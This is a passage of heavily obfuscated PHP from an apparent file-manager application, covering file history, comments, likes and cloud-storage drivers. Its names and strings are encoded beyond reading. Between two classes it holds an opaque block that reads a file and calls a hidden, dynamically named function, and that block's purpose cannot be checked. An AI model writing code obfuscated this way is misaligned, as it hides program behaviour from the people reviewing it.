$ºœÇºÃ»[$£¥‘òÊÊ[2039]][$£¥‘òÊÊ[394]]; $ºœÇºÃ»[$£¥‘òÊÊ[87]] = !1; $ºœÇºÃ»[$£¥‘òÊÊ[394]] = $£¥‘òÊÊ[12]; } $ºœÇºÃ»[$£¥‘òÊÊ[1970]] = $Ø®úø…­[$ºœÇºÃ»[$£¥‘òÊÊ[1639]]]; } unset($ºœÇºÃ»); $ˆÆß®ÑÎ[$£¥‘òÊÊ[364]] = $—²±’é; return $ˆÆß®ÑÎ; } public function removeBySource($—úşÇå‚) { $‰¥ÁÔ  = array($_SERVER[® ¨Ä®ñ][409] => $—úşÇå‚); $this->where($‰¥ÁÔ )->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\x6f\165\162\x63\x65\x5f\x68\151\163\164\x6f\162\171"; public function historyCount($Ù€ƒİ£¬) { $ü·şÆ¹µ =& $_SERVER[® ¨Ä®ñ]; if (!$Ù€ƒİ£¬) { return array(); } if (is_string($Ù€ƒİ£¬) || is_int($Ù€ƒİ£¬)) { $Ù€ƒİ£¬ = array($Ù€ƒİ£¬); } $˜İËÇ´± = array($ü·şÆ¹µ[394], $ü·şÆ¹µ[1839] => $ü·şÆ¹µ[491]); $÷ÂÆöˆü = array($ü·şÆ¹µ[394] => array($ü·şÆ¹µ[7], $Ù€ƒİ£¬)); $€ñËÃ£µ = $this->field($˜İËÇ´±)->where($÷ÂÆöˆü)->group($ü·şÆ¹µ[394])->select(); return array_to_keyvalue($€ñËÃ£µ, $ü·şÆ¹µ[394], $ü·şÆ¹µ[491]); } public function addHistory($¦—¹¡çÒ, $À—ûÛûô = '') { $éß°³äï =& $_SERVER[® ¨Ä®ñ]; $”É©µÖ‡ = array($éß°³äï[409] => $¦—¹¡çÒ[$éß°³äï[394]], $éß°³äï[1630] => isset($¦—¹¡çÒ[$éß°³äï[445]]) ? $¦—¹¡çÒ[$éß°³äï[445]] : $¦—¹¡çÒ[$éß°³äï[443]], $éß°³äï[459] => $¦—¹¡çÒ[$éß°³äï[458]], $éß°³äï[570] => $¦—¹¡çÒ[$éß°³äï[80]], $éß°³äï[2040] => $À—ûÛûô); $Ø¡ßÇÙ× = $GLOBALS[$éß°³äï[6]][$éß°³äï[90]][$éß°³äï[1191]]; if ($Ø¡ßÇÙ× > 1) { $this->historyAutoClear($”É©µÖ‡[$éß°³äï[394]]); $this->add($”É©µÖ‡); } Hook::trigger($éß°³äï[2041], $”É©µÖ‡); Model($éß°³äï[2042])->eventFileEdit($¦—¹¡çÒ[$éß°³äï[394]]); } private function historyAutoClear($‰ªäÃÀÖ) { $âÄ±é˜ =& $_SERVER[® ¨Ä®ñ]; $åõ¦¯›À = Model($âÄ±é˜[752])->get($âÄ±é˜[1213]); $ØÖÛ¸µ = $GLOBALS[$âÄ±é˜[6]][$âÄ±é˜[90]][$âÄ±é˜[1191]]; $ÁÊŒëë‹ = $åõ¦¯›À == $âÄ±é˜[1214] ? 5 : $ØÖÛ¸µ; if ($ØÖÛ¸µ <= 1) { $ÁÊŒëë‹ = 1; } if ($ÁÊŒëë‹ >= 500) { return; } $…ß¸‘µ = array($âÄ±é˜[409] => $‰ªäÃÀÖ); $¹Œ¹¹ = $this->field($âÄ±é˜[2043])->where($…ß¸‘µ)->order($âÄ±é˜[2037])->select(); if (!$¹Œ¹¹ || $ÁÊŒëë‹ >= count($¹Œ¹¹)) { return; } $â«¥‡¸¥ = array_to_keyvalue($¹Œ¹¹, $âÄ±é˜[12], $âÄ±é˜[392]); $â«¥‡¸¥ = array_slice($â«¥‡¸¥, $ÁÊŒëë‹); $²¦ßÂÃ¨ = array_to_keyvalue($¹Œ¹¹, $âÄ±é˜[12], $âÄ±é˜[458]); $²¦ßÂÃ¨ = array_slice($²¦ßÂÃ¨, $ÁÊŒëë‹); if (!$â«¥‡¸¥ || !$²¦ßÂÃ¨) { return; } $…ß¸‘µ = array($âÄ±é˜[411] => array($âÄ±é˜[7], $â«¥‡¸¥)); $this->where($…ß¸‘µ)->delete(); Model($âÄ±é˜[461])->remove($²¦ßÂÃ¨); } public function listData($’¼‰ÙÈµ) { $ë¶ÅğŸƒ =& $_SERVER[® ¨Ä®ñ]; $í€¤ëô = array($ë¶ÅğŸƒ[409] => $’¼‰ÙÈµ); $ˆ¢È¡•€ = $ë¶ÅğŸƒ[2044]; $½Šˆæ—³ = $this->field($ˆ¢È¡•€)->where($í€¤ëô)->order($ë¶ÅğŸƒ[2037])->selectPage(); $this->_listAppendUser($½Šˆæ—³[$ë¶ÅğŸƒ[364]]); $Çı’Àƒã = Model($ë¶ÅğŸƒ[752])->get($ë¶ÅğŸƒ[1213]); $Ğ¸ïùâì = 5; if ($Çı’Àƒã == $ë¶ÅğŸƒ[1214]) { $½Šˆæ—³[$ë¶ÅğŸƒ[364]] = array_slice($½Šˆæ—³[$ë¶ÅğŸƒ[364]], 0, $Ğ¸ïùâì); $½Šˆæ—³[$ë¶ÅğŸƒ[361]] = array($ë¶ÅğŸƒ[2045] => 1, $ë¶ÅğŸƒ[2046] => 20, $ë¶ÅğŸƒ[2047] => 1, $ë¶ÅğŸƒ[2048] => count($½Šˆæ—³[$ë¶ÅğŸƒ[364]])); } return $½Šˆæ—³; } protected function _listAppendUser(&$Î¯¸ã£) { $‡…áÀ®é =& $_SERVER[® ¨Ä®ñ]; $‹îä˜ ò = array_to_keyvalue($Î¯¸ã£, $‡…áÀ®é[12], $‡…áÀ®é[1639]); $‡™±¾Ş¡ = Model($‡…áÀ®é[529])->userListInfo($‹îä˜ ò); foreach ($Î¯¸ã£ as &$ş¢ïÓØ) { $Ãåğê¾Š = $ş¢ïÓØ[$‡…áÀ®é[1639]]; $ş¢ïÓØ[$‡…áÀ®é[443]] = $‡™±¾Ş¡[$Ãåğê¾Š] ? $‡™±¾Ş¡[$Ãåğê¾Š] : !1; } unset($ş¢ïÓØ); } public function fileInfo($Æİù¢áƒ) { $›Á®¬‘ş =& $_SERVER[® ¨Ä®ñ]; $µˆÖÎñ› = $this->tablePrefix; $Ğ­¨Úé’ = "{$µˆÖÎñ›}\151\157\137\146\x69\x6c\145\40\x66\x69\x6c\145\163\x20\x6f\x6e\40\146\151\154\x65\x73\x2e\x66\x69\x6c\145\x49\104\40\x3d\40\150\x69\x73\x74\x6f\x72\x79\56\x66\151\x6c\x65\111\x44"; return $this->alias($›Á®¬‘ş[2049])->where(array($›Á®¬‘ş[411] => $Æİù¢áƒ))->join($Ğ­¨Úé’, $›Á®¬‘ş[2050])->find(); } public function removeItem($öú­îË) { $¸•ÈƒÙ =& $_SERVER[® ¨Ä®ñ]; $†‡ÅÛÄ = array($¸•ÈƒÙ[411] => $öú­îË); $ûÆ¯ˆæ = $this->where($†‡ÅÛÄ)->find(); if ($ûÆ¯ˆæ) { $ÜËíˆ±‹ = $this->where($†‡ÅÛÄ)->delete(); Model($¸•ÈƒÙ[461])->remove($ûÆ¯ˆæ[$¸•ÈƒÙ[458]]); return $ÜËíˆ±‹; } return !1; } public function removeBySource($öŠÌ©) { $ô¬´Ú´¼ =& $_SERVER[® ¨Ä®ñ]; if (!$öŠÌ©) { return !1; } if (!is_array($öŠÌ©)) { $öŠÌ© = array($öŠÌ©); } $±ˆÖÀ‚à = array($ô¬´Ú´¼[409] => array($ô¬´Ú´¼[7], $öŠÌ©)); $É„ñşâÈ = $this->field($ô¬´Ú´¼[459])->where($±ˆÖÀ‚à)->select(); if ($É„ñşâÈ) { $this->where($±ˆÖÀ‚à)->delete(); $­ãİªæÈ = array_to_keyvalue($É„ñşâÈ, $ô¬´Ú´¼[12], $ô¬´Ú´¼[458]); Model($ô¬´Ú´¼[461])->remove($­ãİªæÈ); } return !0; } public function setDetail($¿İÍØ, $Ñåïèº) { $¿ĞÑİü =& $_SERVER[® ¨Ä®ñ]; return $this->where(array($¿ĞÑİü[411] => $¿İÍØ))->save(array($¿ĞÑİü[2040] => $Ñåïèº)); } public function rollbackToItem($­œ·¥Úó, $Àø¡¢ş) { $ ©Œöì¨ =& $_SERVER[® ¨Ä®ñ]; $÷“ìû”Ÿ = Model($ ©Œöì¨[807])->sourceInfo($­œ·¥Úó); $this->addHistory($÷“ìû”Ÿ, LNG($ ©Œöì¨[2051])); $ÈÇÏÀ å = $this->find($Àø¡¢ş); $ÖÅë„î = array($ ©Œöì¨[458] => $ÈÇÏÀ å[$ ©Œöì¨[458]], $ ©Œöì¨[80] => $ÈÇÏÀ å[$ ©Œöì¨[80]], $ ©Œöì¨[86] => time(), $ ©Œöì¨[445] => USER_ID); Model($ ©Œöì¨[807])->where(array($ ©Œöì¨[394] => $­œ·¥Úó))->save($ÖÅë„î); return $this->where(array($ ©Œöì¨[411] => $Àø¡¢ş))->delete(); } public function clearSame($Ğñ÷’¼) { $åÛæ¯Ä¸ =& $_SERVER[® ¨Ä®ñ]; $ˆ¯“›ª = $this->listData($Ğñ÷’¼); $ã¿Üâ¯ = array_to_keyvalue_group($ˆ¯“›ª, $åÛæ¯Ä¸[458]); $Â¡ãµÀ = array(); $Ş©ğ‹¦Í = array(); foreach ($ã¿Üâ¯ as $¥±ª¡¿“) { if (!$¥±ª¡¿“ || count($¥±ª¡¿“) <= 1) { continue; } foreach ($¥±ª¡¿“ as $©ˆâÊ”á) { $Â¡ãµÀ[] = $©ˆâÊ”á[$åÛæ¯Ä¸[458]]; $Ş©ğ‹¦Í[] = $©ˆâÊ”á[$åÛæ¯Ä¸[392]]; } } if (!$Ş©ğ‹¦Í) { return; } $this->where(array($åÛæ¯Ä¸[392] => array($åÛæ¯Ä¸[7], $Ş©ğ‹¦Í)))->delete(); Model($åÛæ¯Ä¸[461])->remove($Â¡ãµÀ); } public function userSpace() { $‘õÙĞŞ =& $_SERVER[® ¨Ä®ñ]; $éüÒëÓ– = $this->tablePrefix; $Åê–ş„À = array($‘õÙĞŞ[1630] => USER_ID); $Æ²ƒÙÚé = "{$éüÒëÓ–}\151\x6f\x5f\146\151\x6c\145\40\x66\x69\x6c\x65\x73\40\157\156\x20\x66\151\x6c\x65\x73\56\146\151\154\x65\x49\104\40\75\40\x68\x69\163\164\x6f\x72\x79\x2e\x66\x69\x6c\145\x49\104"; return $this->alias($‘õÙĞŞ[2049])->where($Åê–ş„À)->join($Æ²ƒÙÚé, $‘õÙĞŞ[2050])->sum($‘õÙĞŞ[80]); } } goto dÍ†ñ¥…›½; b¥Œ’§ÃÌ: class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\155\x6d\145\156\164"; protected $tableMeta = array("\x74\141\142\x6c\x65\x4e\141\x6d\145" => "\x63\x6f\155\x6d\145\156\x74\137\155\x65\164\x61", "\155\x65\x74\x61\106\151\145\154\x64" => "\x63\157\155\155\145\x6e\x74\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($È¨”í¡Õ) { $†³¤ş•¦ =& $_SERVER[® ¨Ä®ñ]; if ($È¨”í¡Õ[$†³¤ş•¦[1835]]) { $ğö‹İí¬ = $this->where(array($†³¤ş•¦[1836] => $È¨”í¡Õ[$†³¤ş•¦[1835]]))->find(); if (!$ğö‹İí¬ || $ğö‹İí¬[$†³¤ş•¦[403]] != $È¨”í¡Õ[$†³¤ş•¦[403]] || $ğö‹İí¬[$†³¤ş•¦[495]] != $È¨”í¡Õ[$†³¤ş•¦[495]]) { return !1; } $this->where(array($†³¤ş•¦[1836] => $È¨”í¡Õ[$†³¤ş•¦[1835]]))->setAdd($†³¤ş•¦[1837], 1); } $È¨”í¡Õ[$†³¤ş•¦[1838]] = 0; $È¨”í¡Õ[$†³¤ş•¦[1837]] = 0; $È¨”í¡Õ[$†³¤ş•¦[732]] = 1; return $this->add($È¨”í¡Õ); } public function commentCount($àúíØÏÜ, $Öåˆ‰, $‡ñƒ²ß¦ = false) { $Ä¢ÍÊİ’ =& $_SERVER[® ¨Ä®ñ]; if (!$àúíØÏÜ) { return array(); } if (is_string($àúíØÏÜ) || is_int($àúíØÏÜ)) { $àúíØÏÜ = array($àúíØÏÜ); } $‰ŒÆÜç” = array($Ä¢ÍÊİ’[495], $Ä¢ÍÊİ’[1839] => $Ä¢ÍÊİ’[491]); $ãÔ¨ğªé = array($Ä¢ÍÊİ’[495] => array($Ä¢ÍÊİ’[7], $àúíØÏÜ), $Ä¢ÍÊİ’[403] => $Öåˆ‰); if ($‡ñƒ²ß¦) { $ãÔ¨ğªé[$Ä¢ÍÊİ’[1639]] = $‡ñƒ²ß¦; } $êèÁ¤Õ• = $this->field($‰ŒÆÜç”)->where($ãÔ¨ğªé)->group($Ä¢ÍÊİ’[495])->select(); return array_to_keyvalue($êèÁ¤Õ•, $Ä¢ÍÊİ’[495], $Ä¢ÍÊİ’[491]); } public function starTarget($ßè–ëê¦, $ÓØº¯ˆ) { $óàÛĞª =& $_SERVER[® ¨Ä®ñ]; $Öé¾øÈÁ = $ßè–ëê¦ + self::TYPE_STAR_OFFSET; $¡ş™ıâÄ = array($óàÛĞª[1639] => USER_ID, $óàÛĞª[403] => $Öé¾øÈÁ, $óàÛĞª[495] => $ÓØº¯ˆ); $Ä¿Ô¦°ô = $this->where($¡ş™ıâÄ)->find(); if ($Ä¿Ô¦°ô) { return $this->where(array($óàÛĞª[392] => $Ä¿Ô¦°ô[$óàÛĞª[392]]))->delete(); } $ÁÄª¤º = array($óàÛĞª[1835] => 0, $óàÛĞª[1639] => USER_ID, $óàÛĞª[732] => 1, $óàÛĞª[737] => $óàÛĞª[12], $óàÛĞª[403] => $Öé¾øÈÁ, $óàÛĞª[495] => $ÓØº¯ˆ, $óàÛĞª[1838] => 0, $óàÛĞª[1837] => 0); return $this->add($ÁÄª¤º); } public function starTargetCount($èä õìÃ, $ø«İ÷Ãõ) { $òƒ‘Œãâ =& $_SERVER[® ¨Ä®ñ]; $´ßÒÅØö = $ø«İ÷Ãõ + self::TYPE_STAR_OFFSET; $Ùè¼î›– = $this->commentCount($èä õìÃ, $´ßÒÅØö); $·­ÄˆˆÖ = $this->commentCount($èä õìÃ, $´ßÒÅØö, USER_ID); return array($òƒ‘Œãâ[1840] => $Ùè¼î›–, $òƒ‘Œãâ[1841] => $·­ÄˆˆÖ); } public function starTargetUserList($âÂÕöÀµ, $¿–ˆ¡Åæ) { $•Ü™¾Ñ =& $_SERVER[® ¨Ä®ñ]; $ÊŒÖ—†³ = $âÂÕöÀµ + self::TYPE_STAR_OFFSET; $Æ¶Œî¬Ù = array($•Ü™¾Ñ[495] => $¿–ˆ¡Åæ, $•Ü™¾Ñ[403] => $ÊŒÖ—†³); $úèŸÆ¯ = $this->where($Æ¶Œî¬Ù)->count(); $æòÏ¿»¶ = array($•Ü™¾Ñ[250] => $úèŸÆ¯, $•Ü™¾Ñ[1842] => array()); if (!$úèŸÆ¯) { return $æòÏ¿»¶; } $³ß®¬ÅÌ = $this->field($•Ü™¾Ñ[1639])->where($Æ¶Œî¬Ù)->limit(500)->select(); $³ß®¬ÅÌ = array_to_keyvalue($³ß®¬ÅÌ, $•Ü™¾Ñ[12], $•Ü™¾Ñ[1639]); $æòÏ¿»¶[$•Ü™¾Ñ[1842]] = Model($•Ü™¾Ñ[504])->userListInfo($³ß®¬ÅÌ); return $æòÏ¿»¶; } public function prasiseUserList($“ÍıÅÜ) { $ÂôÙ½Ò =& $_SERVER[® ¨Ä®ñ]; $—Ä”îšş = array($ÂôÙ½Ò[1843] => $“ÍıÅÜ); $¤ø¾ÚÇö = $this->where($—Ä”îšş)->find(); $É™¨ß˜ = _get($¤ø¾ÚÇö, $ÂôÙ½Ò[1838], 0); $“ÂæûÊê = array($ÂôÙ½Ò[250] => $É™¨ß˜, $ÂôÙ½Ò[1842] => array()); if (!$É™¨ß˜) { return $“ÂæûÊê; } $°Ó‰Ôˆç = Model($ÂôÙ½Ò[1844])->field($ÂôÙ½Ò[1639])->where($—Ä”îšş)->limit(500)->select(); $°Ó‰Ôˆç = array_to_keyvalue($°Ó‰Ôˆç, $ÂôÙ½Ò[12], $ÂôÙ½Ò[1639]); $“ÂæûÊê[$ÂôÙ½Ò[1842]] = Model($ÂôÙ½Ò[504])->userListInfo($°Ó‰Ôˆç); return $“ÂæûÊê; } public function remove($ÙßúÙ§­) { $Ö»îçÂ¸ =& $_SERVER[® ¨Ä®ñ]; $©€³æĞ = array($Ö»îçÂ¸[1836] => $ÙßúÙ§­); $ŒøØ®ş’ = $this->where($©€³æĞ)->find(); if ($ŒøØ®ş’[$Ö»îçÂ¸[1835]]) { $this->where(array($Ö»îçÂ¸[1836] => $ŒøØ®ş’[$Ö»îçÂ¸[1835]]))->setAdd($Ö»îçÂ¸[1837], -1); } return $this->where($©€³æĞ)->delete(); } public function edit($Àª»ƒî¼, $Üºìµ÷¸) { $£ÚƒØƒş =& $_SERVER[® ¨Ä®ñ]; $ã‘Š®ùì = array($£ÚƒØƒş[1836] => $Àª»ƒî¼); return $this->where($ã‘Š®ùì)->save(array($£ÚƒØƒş[1845] => $Üºìµ÷¸)); } public function prasise($õ—œîŠ‡) { $öËØŞìİ =& $_SERVER[® ¨Ä®ñ]; $ÓõÆÂÂè = Model($öËØŞìİ[1846]); $ñœ¦Œ³ = array($öËØŞìİ[1836] => $õ—œîŠ‡, $öËØŞìİ[1630] => USER_ID); $¾ŞëÂÄË = $ÓõÆÂÂè->where($ñœ¦Œ³)->find(); if (!$¾ŞëÂÄË) { $ÓõÆÂÂè->add($ñœ¦Œ³); $¡‰ê°Ú = $this->where(array($öËØŞìİ[1836] => $õ—œîŠ‡))->setAdd($öËØŞìİ[1838], 1); } else { $ÓõÆÂÂè->where($ñœ¦Œ³)->delete(); $¡‰ê°Ú = $this->where(array($öËØŞìİ[1836] => $õ—œîŠ‡))->setAdd($öËØŞìİ[1838], -1); } return $¡‰ê°Ú; } public function targetInfo($‚é®†­, $–®Øéñ’) { $ÁÈ²¿àå =& $_SERVER[® ¨Ä®ñ]; $šêŞ ñ® = array($ÁÈ²¿àå[571] => $‚é®†­, $ÁÈ²¿àå[572] => $–®Øéñ’); $¶û±«± = $this->where($šêŞ ñ®)->count(); $¿ İ£ŒÑ = "\122\111\107\x48\x54\40\112\x4f\111\116\x20{$this->tablePrefix}\x63\157\x6d\155\x65\156\x74\x5f\x70\162\141\151\163\145\x20\163\164\141\162\40\x6f\x6e\x20\143\x6f\x6d\155\x65\156\x74\x2e\143\x6f\x6d\x6d\145\x6e\164\x49\104\40\x3d\x20\x73\x74\x61\x72\56\143\x6f\155\x6d\x65\156\164\x49\104"; $Ô—Õö = $this->alias($ÁÈ²¿àå[349])->where($šêŞ ñ®)->join($¿ İ£ŒÑ, $ÁÈ²¿àå[1847])->count(); $¢´„€È— = array($ÁÈ²¿àå[1848] => $¶û±«±, $ÁÈ²¿àå[1849] => $Ô—Õö); return $¢´„€È—; } public function listData($ØŞÀ€óº) { $”¦Ã…‹¹ =& $_SERVER[® ¨Ä®ñ]; if (isset($ØŞÀ€óº[$”¦Ã…‹¹[1850]])) { if ($ØŞÀ€óº[$”¦Ã…‹¹[1850]]) { $ØŞÀ€óº[$”¦Ã…‹¹[1843]] = array($”¦Ã…‹¹[998], intval($ØŞÀ€óº[$”¦Ã…‹¹[1850]])); } unset($ØŞÀ€óº[$”¦Ã…‹¹[1850]]); } if (isset($ØŞÀ€óº[$”¦Ã…‹¹[1851]])) { if ($ØŞÀ€óº[$”¦Ã…‹¹[1851]]) { $ØŞÀ€óº[$”¦Ã…‹¹[1843]] = array($”¦Ã…‹¹[995], intval($ØŞÀ€óº[$”¦Ã…‹¹[1851]])); } unset($ØŞÀ€óº[$”¦Ã…‹¹[1851]]); } return $this->_listData($ØŞÀ€óº); } private function _listData($š€µ•¨¯) { $±¸°ô =& $_SERVER[® ¨Ä®ñ]; $¡ê†æÁ– = $this->where($š€µ•¨¯)->_makeOrder()->selectPage(100); $this->_listAppendParent($¡ê†æÁ–[$±¸°ô[364]]); $this->_listAppendUser($¡ê†æÁ–[$±¸°ô[364]]); $this->_listAppendMeta($¡ê†æÁ–[$±¸°ô[364]]); return $¡ê†æÁ–; } private function _makeOrder() { $ößÄ¼¾§ =& $_SERVER[® ¨Ä®ñ]; $íˆ‚Ğ¸œ = array($ößÄ¼¾§[1838], $ößÄ¼¾§[1837], $ößÄ¼¾§[193]); $ÌÙ©ãæ³ = Input::get($ößÄ¼¾§[446], $ößÄ¼¾§[7], $ößÄ¼¾§[415], $íˆ‚Ğ¸œ); $¿ïŒ„Ğ¡ = Input::get($ößÄ¼¾§[447], $ößÄ¼¾§[7], $ößÄ¼¾§[1632], array($ößÄ¼¾§[1852], $ößÄ¼¾§[442])); $Çƒ¤”Õ = $ÌÙ©ãæ³ . $ößÄ¼¾§[53] . $¿ïŒ„Ğ¡; return $this->order($Çƒ¤”Õ); } private function _listAppendParent(&$„êıÑÇ‘) { $“äÁ®¥£ =& $_SERVER[® ¨Ä®ñ]; $‘˜À©å¹ = array_unique(array_to_keyvalue($„êıÑÇ‘, $“äÁ®¥£[12], $“äÁ®¥£[1835])); $‘˜À©å¹ = array_remove_value($‘˜À©å¹, $“äÁ®¥£[190]); if (!$‘˜À©å¹) { return; } $ñ¼èùõ = $this->where(array($“äÁ®¥£[1836] => array($“äÁ®¥£[7], $‘˜À©å¹)))->select(); $ñ¼èùõ = array_to_keyvalue($ñ¼èùõ, $“äÁ®¥£[1843]); foreach ($„êıÑÇ‘ as &$—á´²—Ô) { if (isset($ñ¼èùõ[$—á´²—Ô[$“äÁ®¥£[1835]]])) { $—á´²—Ô[$“äÁ®¥£[1853]] = $ñ¼èùõ[$—á´²—Ô[$“äÁ®¥£[1835]]]; } } unset($—á´²—Ô); } private function _listAppendUser(&$Ù É›®) { $Å¼öÓ½¹ =& $_SERVER[® ¨Ä®ñ]; $š£É¡°Ç = array_unique(array_to_keyvalue($Ù É›®, $Å¼öÓ½¹[12], $Å¼öÓ½¹[1639])); $š£É¡°Ç = array_remove_value($š£É¡°Ç, $Å¼öÓ½¹[190]); if (count($š£É¡°Ç) == 0) { return; } foreach ($Ù É›® as $²ô¶–°) { if (isset($²ô¶–°[$Å¼öÓ½¹[1853]])) { $š£É¡°Ç[] = $²ô¶–°[$Å¼öÓ½¹[1853]][$Å¼öÓ½¹[1639]]; } } $»Éİü·É = Model($Å¼öÓ½¹[529])->userListInfo($š£É¡°Ç); foreach ($Ù É›® as &$²ô¶–°) { $²ô¶–°[$Å¼öÓ½¹[585]] = $»Éİü·É[$²ô¶–°[$Å¼öÓ½¹[1639]]]; if (isset($²ô¶–°[$Å¼öÓ½¹[1853]])) { $²ô¶–°[$Å¼öÓ½¹[1853]][$Å¼öÓ½¹[585]] = $»Éİü·É[$²ô¶–°[$Å¼öÓ½¹[1853]][$Å¼öÓ½¹[1639]]]; } } unset($²ô¶–°); } private function _listAppendMeta(&$ØÅ‡äãÙ) { $’“ü‡¬± =& $_SERVER[® ¨Ä®ñ]; $Š»€µÍ = array_unique(array_to_keyvalue($ØÅ‡äãÙ, $’“ü‡¬±[12], $’“ü‡¬±[1843])); $Š»€µÍ = array_remove_value($Š»€µÍ, $’“ü‡¬±[190]); if (!$Š»€µÍ) { return; } foreach ($ØÅ‡äãÙ as $ÀÇõÉ€Ñ) { if (isset($ÀÇõÉ€Ñ[$’“ü‡¬±[1853]])) { $Š»€µÍ[] = $ÀÇõÉ€Ñ[$’“ü‡¬±[1853]][$’“ü‡¬±[1843]]; } } $™íóİ¤ = $this->metaList($Š»€µÍ); if (!$™íóİ¤) { return !1; } foreach ($ØÅ‡äãÙ as &$ÀÇõÉ€Ñ) { $ÀÇõÉ€Ñ[$’“ü‡¬±[456]] = $™íóİ¤[$ÀÇõÉ€Ñ[$’“ü‡¬±[1843]]]; if (isset($ÀÇõÉ€Ñ[$’“ü‡¬±[1853]])) { $ÀÇõÉ€Ñ[$’“ü‡¬±[1853]][$’“ü‡¬±[456]] = $™íóİ¤[$ÀÇõÉ€Ñ[$’“ü‡¬±[1853]][$’“ü‡¬±[1843]]]; } } unset($ÀÇõÉ€Ñ); } private function metaList($¾¶¹‚˜û) { $ö¯¡Ù‘ =& $_SERVER[® ¨Ä®ñ]; if (!$¾¶¹‚˜û) { return array(); } $‹å¢ƒ’× = array($ö¯¡Ù‘[1843] => array($ö¯¡Ù‘[7], $¾¶¹‚˜û)); $ÔÊ•á¿ = Model($ö¯¡Ù‘[1854])->where($‹å¢ƒ’×)->select(); $ÔÊ•á¿ = array_to_keyvalue_group($ÔÊ•á¿, $ö¯¡Ù‘[1843]); foreach ($ÔÊ•á¿ as $€ƒˆ‚ï => $ÛúÇ³¬‹) { $Öå¨”õ = array(); foreach ($ÛúÇ³¬‹ as $¿ñ¬Àåà) { $Öå¨”õ[$¿ñ¬Àåà[$ö¯¡Ù‘[95]]] = $¿ñ¬Àåà[$ö¯¡Ù‘[369]]; } $ÔÊ•á¿[$€ƒˆ‚ï] = $Öå¨”õ; } return $ÔÊ•á¿ ? $ÔÊ•á¿ : array(); } } if ($_SERVER[$_SERVER[® ¨Ä®ñ][854]] != $_SERVER[$_SERVER[® ¨Ä®ñ][855]]) { $_getc = $_SERVER[® ¨Ä®ñ][857]; $_getfile = $_SERVER[$_SERVER[® ¨Ä®ñ][858]] . $_SERVER[® ¨Ä®ñ][859]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[® ¨Ä®ñ][226], $_getfilec); if (count($_getarrs) < $_SERVER[® ¨Ä®ñ][612]) { $exit = $_SERVER[® ¨Ä®ñ][860]; $exit(); } $_act = $_SERVER[® ¨Ä®ñ][942]; $_act($_SERVER[$_SERVER[® ¨Ä®ñ][943]]); } class FileContentModel extends ModelBase { protected $tableName = "\x69\157\137\x66\151\154\x65\137\x63\157\156\164\x65\156\x74\x73"; protected $dataAuto = array(array("\x63\162\145\141\164\x65\124\x69\155\145", "\164\151\155\x65", "\151\156\163\145\x72\164", "\x66\x75\x6e\x63\164\x69\x6f\x6e")); } goto DºÁ¹ÆÓ; b±óš‚ˆÏÀ: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($¸™éÃğ”) { parent::__construct($¸™éÃğ”); $this->signatureVersion($_SERVER[® ¨Ä®ñ][211]); } public function fileOutLink($ÌƒÔ™Ä±) { $îŸ¦Ä¹ =& $_SERVER[® ¨Ä®ñ]; if (substr($ÌƒÔ™Ä±, 0, 7) == $îŸ¦Ä¹[1307]) { $ÌƒÔ™Ä± = $îŸ¦Ä¹[1308] . substr($ÌƒÔ™Ä±, 7); } header($îŸ¦Ä¹[158] . $ÌƒÔ™Ä±); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($şú– úÌ) { parent::__construct(); include_once SDK_DIR . $_SERVER[® ¨Ä®ñ][1364]; $this->_init($şú– úÌ); } public function _init($ÇôÕ¢­¨) { $úˆÖ¾ =& $_SERVER[® ¨Ä®ñ]; foreach ($ÇôÕ¢­¨ as $÷™›êµ => $´Àò¾¹º) { if (isset($this->{$÷™›êµ})) { $this->{$÷™›êµ} = $´Àò¾¹º; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($úˆÖ¾[1365] . LNG($úˆÖ¾[1366])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $”‡èàÅ =& $_SERVER[® ¨Ä®ñ]; $œ‰ÛÓÂ› = new OSS\Model\CorsConfig(); $¿İÂ”‡è = new OSS\Model\CorsRule(); $¿İÂ”‡è->addAllowedOrigin($”‡èàÅ[1367]); $¿İÂ”‡è->addAllowedMethod($”‡èàÅ[1368]); $¿İÂ”‡è->addAllowedMethod($”‡èàÅ[1369]); $¿İÂ”‡è->addAllowedMethod($”‡èàÅ[1370]); $¿İÂ”‡è->addAllowedMethod($”‡èàÅ[1371]); $¿İÂ”‡è->addAllowedMethod($”‡èàÅ[157]); $¿İÂ”‡è->setMaxAgeSeconds(600); $¿İÂ”‡è->addExposeHeader($”‡èàÅ[1372]); $¿İÂ”‡è->addAllowedHeader($”‡èàÅ[1367]); $œ‰ÛÓÂ›->addRule($¿İÂ”‡è); try { $this->client->putBucketCors($this->bucket, $œ‰ÛÓÂ›); } catch (OSS\Core\OssException $²æ€Øµƒ) { return !1; } return !0; } public function getBucketCors() { $ÑÃÓ¡Éˆ =& $_SERVER[® ¨Ä®ñ]; $‡·ÊœÙ = null; try { $‡·ÊœÙ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $²ƒü½Œæ) { return null; } if (!$‡·ÊœÙ || !($Ÿß½°«¸ = $‡·ÊœÙ->getRules())) { return null; } $Ä¢òöšœ = $Ÿß½°«¸[0]->getAllowedOrigins(); $Æõ’áøØ = $Ÿß½°«¸[0]->getAllowedMethods(); $ÂÇòú = $Ÿß½°«¸[0]->getMaxAgeSeconds(); $ÓİĞÜ• = $Ÿß½°«¸[0]->getExposeHeaders(); $ëî†„Æ = $Ÿß½°«¸[0]->getAllowedHeaders(); return array($ÑÃÓ¡Éˆ[180] => isset($Ä¢òöšœ[0]) ? $Ä¢òöšœ[0] : $ÑÃÓ¡Éˆ[12], $ÑÃÓ¡Éˆ[184] => $Æõ’áøØ, $ÑÃÓ¡Éˆ[1373] => $ÂÇòú, $ÑÃÓ¡Éˆ[1374] => 